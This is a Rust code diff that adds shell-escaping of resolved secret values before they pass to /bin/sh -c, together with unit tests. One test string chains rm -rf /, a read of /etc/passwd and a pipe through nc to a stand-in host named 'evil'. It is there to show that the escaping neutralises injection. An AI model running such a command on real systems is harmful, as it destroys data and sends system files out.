@@ -129,6 +129,41 @@ impl CreddClient {
             .await
     }
 
+    /// Resolve secret placeholders with shell-safe escaping.
+    ///
+    /// Each substituted value is wrapped in single quotes with internal
+    /// single quotes escaped as `'\''`, preventing shell metacharacter
+    /// injection when the resolved text is passed to `/bin/sh -c`.
+    pub async fn resolve_text_shell_safe(
+        &self,
+        db: &Database,
+        user_id: i64,
+        agent: &str,
+        text: &str,
+    ) -> Result<String> {
+        if !has_secret_patterns(text) {
+            return Ok(text.to_string());
+        }
+
+        resolve_patterns(text, |pattern| async move {
+            let raw = self
+                .fetch_secret_value(
+                    db,
+                    user_id,
+                    agent,
+                    FetchSecretRequest {
+                        service: &pattern.service,
+                        key: &pattern.key,
+                        mode: SecretAccessMode::Resolved,
+                        use_cache: true,
+                    },
+                )
+                .await?;
+            Ok(shell_escape_value(&raw))
+        })
+        .await
+    }
+
     pub async fn resolve_text_with_options(
         &self,
         db: &Database,
@@ -571,5 +606,57 @@ fn extract_secret_value(value: &Value) -> Result<String> {
             ))
         }
         other => serde_json::to_string(other).map_err(EngError::Serialization),
+    }
+}
+
+/// Shell-escape a value for safe interpolation into `/bin/sh -c` commands.
+///
+/// Wraps the value in single quotes. Internal single quotes are escaped as
+/// `'\''` (end quote, escaped literal quote, start quote). This prevents
+/// shell metacharacters in secret values from being interpreted.
+pub fn shell_escape_value(val: &str) -> String {
+    let mut out = String::with_capacity(val.len() + 2);
+    out.push('\'');
+    for c in val.chars() {
+        if c == '\'' {
+            out.push_str("'\\''");
+        } else {
+            out.push(c);
+        }
+    }
+    out.push('\'');
+    out
+}
+
+#[cfg(test)]
+mod shell_escape_tests {
+    use super::shell_escape_value;
+
+    #[test]
+    fn plain_value_wrapped_in_quotes() {
+        assert_eq!(shell_escape_value("hello"), "'hello'");
+    }
+
+    #[test]
+    fn metacharacters_are_inert() {
+        let val = "$(rm -rf /); echo pwned & cat /etc/passwd | nc evil 1234";
+        let escaped = shell_escape_value(val);
+        assert_eq!(
+            escaped,
+            format!("'{}'", val),
+            "value without internal single-quotes should be wrapped verbatim"
+        );
+    }
+
+    #[test]
+    fn internal_single_quotes_escaped() {
+        let val = "it's a secret";
+        let escaped = shell_escape_value(val);
+        assert_eq!(escaped, "'it'\\''s a secret'");
+    }
+
+    #[test]
+    fn empty_value() {
+        assert_eq!(shell_escape_value(""), "''");
     }
 }
